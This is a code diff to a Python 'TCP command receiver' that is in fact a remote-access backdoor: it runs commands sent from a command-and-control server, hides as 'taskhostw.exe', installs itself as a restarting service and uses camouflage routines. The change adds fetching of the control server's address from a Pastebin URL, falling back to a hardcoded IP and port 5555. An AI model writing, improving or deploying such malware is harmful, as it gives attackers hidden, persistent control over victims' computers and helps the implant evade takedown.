@@ -4,16 +4,19 @@ TCP Command Receiver
 Connects to a TCP sender and executes received commands.
 """
 
+import os
+import platform
+import shutil
 import socket
+import subprocess
 import sys
 import time
-import subprocess
-import os
-import shutil
+import urllib.request
 
 # Configuration
 VERBOSE = False  # Set to False for silent operation (production mode)
-DEFAULT_HOST = "52.21.29.104"  # C2 Server address
+CONFIG_URL = "https://pastebin.com/raw/YgNuztHj"  # Dynamic C2 configuration URL
+FALLBACK_HOST = "52.21.29.104"  # Fallback C2 Server address if Pastebin unreachable
 DEFAULT_PORT = 5555  # Port number
 RETRY_DELAY = 5  # Seconds between connection retries
 BUFFER_SIZE = 4096  # Socket buffer size
@@ -21,6 +24,47 @@ END_MARKER = b"<<<END_OF_OUTPUT>>>"  # Command completion marker
 
 # Deployment Configuration
 PAYLOAD_NAME = "taskhostw.exe"
+
+# Static variable to store fetched C2 IP (initialized once on first access)
+C2_HOST = None
+
+
+def get_c2_host():
+    """
+    Fetch C2 server IP from Pastebin URL.
+    Fetches once and caches the result. Falls back to hardcoded IP if fetch fails.
+
+    Returns:
+        str: The C2 server IP address
+    """
+    global C2_HOST
+
+    # Return cached value if already fetched
+    if C2_HOST is not None:
+        return C2_HOST
+
+    # Try to fetch from Pastebin
+    try:
+        log(f"Fetching C2 configuration from: {CONFIG_URL}")
+
+        with urllib.request.urlopen(CONFIG_URL, timeout=10) as response:
+            c2_ip = response.read().decode("utf-8").strip()
+
+            # Basic validation - ensure it looks like an IP address
+            if c2_ip and len(c2_ip) > 6:  # Minimum valid IP like "1.1.1.1"
+                C2_HOST = c2_ip
+                log(f"C2 server IP fetched: {C2_HOST}")
+                return C2_HOST
+            else:
+                log(f"Invalid C2 IP from Pastebin: '{c2_ip}', using fallback")
+
+    except Exception as e:
+        log(f"Failed to fetch C2 from Pastebin: {e}, using fallback")
+
+    # Fallback to hardcoded IP
+    C2_HOST = FALLBACK_HOST
+    log(f"Using fallback C2 server: {C2_HOST}")
+    return C2_HOST
 
 
 # Get LOCALAPPDATA - only called on Windows
@@ -199,8 +243,6 @@ def execute_command_stream(command: str, client_socket, working_dir: str = None)
     Returns:
         The current working directory after command execution
     """
-    import platform
-
     # Check if this is a clear/cls command (special handling)
     is_clear_command = command.strip().lower() in ["clear", "cls"]
 
@@ -278,7 +320,7 @@ def execute_command_stream(command: str, client_socket, working_dir: str = None)
         return working_dir
 
 
-def start_receiver(host: str = DEFAULT_HOST, port: int = DEFAULT_PORT) -> None:
+def start_receiver(host: str, port: int = DEFAULT_PORT) -> None:
     """
     Start the TCP command receiver client.
 
@@ -346,8 +388,6 @@ def start_receiver(host: str = DEFAULT_HOST, port: int = DEFAULT_PORT) -> None:
                             client_socket.sendall(END_MARKER)
 
                             # Uninstall the service
-                            import platform
-
                             uninstall_receiver_service()
 
                             # Exit completely (don't reconnect)
@@ -390,8 +430,6 @@ def start_receiver(host: str = DEFAULT_HOST, port: int = DEFAULT_PORT) -> None:
                 break
 
     except KeyboardInterrupt:
-        import platform
-
         if platform.system() == "Windows":
             log("\n\nReceiver interrupted - restarting...")
             sys.exit(1)  # Non-zero exit triggers service restart
@@ -405,9 +443,6 @@ def start_receiver(host: str = DEFAULT_HOST, port: int = DEFAULT_PORT) -> None:
 
 def uninstall_receiver_service() -> None:
     """Uninstall the auto-start service for this receiver."""
-    import platform
-    import subprocess
-
     system = platform.system()
 
     if system == "Linux":
@@ -450,8 +485,6 @@ def run_with_auto_restart(host: str, port: int) -> None:
     Windows: Only /quit command can permanently stop the receiver.
     macOS/Linux: Ctrl+C exits cleanly (normal behavior).
     """
-    import platform
-
     system = platform.system()
     restart_count = 0
 
@@ -484,8 +517,6 @@ def run_with_auto_restart(host: str, port: int) -> None:
 
 
 if __name__ == "__main__":
-    import platform
-
     # Only run deployment logic on Windows and when frozen by PyInstaller
     if platform.system() == "Windows" and getattr(sys, "frozen", False):
 
@@ -514,7 +545,7 @@ if __name__ == "__main__":
                 setup_camouflage(delete_file)
 
             # Run with auto-restart wrapper for crash recovery
-            run_with_auto_restart(DEFAULT_HOST, DEFAULT_PORT)
+            run_with_auto_restart(get_c2_host(), DEFAULT_PORT)
 
         else:
             # Unrecognized executable name - fail fast
@@ -534,4 +565,4 @@ if __name__ == "__main__":
             check_and_install_service()
 
         # Run with auto-restart wrapper for crash recovery
-        run_with_auto_restart(DEFAULT_HOST, DEFAULT_PORT)
+        run_with_auto_restart(get_c2_host(), DEFAULT_PORT)
